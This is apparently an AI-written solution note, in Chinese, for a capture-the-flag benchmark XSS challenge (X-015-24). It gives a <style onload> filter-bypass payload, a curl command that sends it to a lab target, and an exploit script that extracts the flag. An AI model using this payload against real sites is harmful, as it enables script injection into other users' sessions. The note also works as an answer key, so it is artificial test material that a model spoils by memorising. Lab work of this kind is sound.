# X-015-24 利用说明（XSS，一键脚本与命令）

## 漏洞原理（简述）
- 服务器会移除除 `<style>` 以外的所有标签，所以我们只能使用 `<style>`。
- `<style>` 仍可携带事件属性（如 `onload`），样式加载时触发 JS。
- 校验器只认弹窗消息严格等于 `XSS`，因此使用 `prompt(/XSS/.source)` 最稳妥。

## 直接利用命令（带目标 IP/端口）

```bash
# 使用换行避免空格（部分题会拦截空格字符）
curl "http://ip32780/page?name=%3Cstyle%0Aonload%3Dprompt(%2FXSS%2F.source)%3E"
```

返回中应包含：

```
<div class="solution-text"><img ... alt="Correct" ...>Congratulations!<p> Here is the flag: FLAG{...}</div>
```

## 脚本用法（exp.py）

- 路径：`benchmarks/X-015-24/exp.py`
- 运行：

```bash
python3 benchmarks/X-015-24/exp.py
```

- 行为：对固定目标 `http://ip32780/page` 发送 `name=<style\nonload=prompt(/XSS/.source)>`（注意 `\n` 为换行），解析返回并打印 flag；未解析到则打印完整响应以便排查。

## 备注
- 若目标端口不同，请将脚本中的 `TARGET_URL` 改为实际的 IP:Port；或告诉我正确端口，我来帮你改成“开箱即用”。
- 若个别环境 `<style onload>` 不触发，可尝试在 `<style>` 中加入 `@import` 来触发加载流程（通常当前题目无需）。
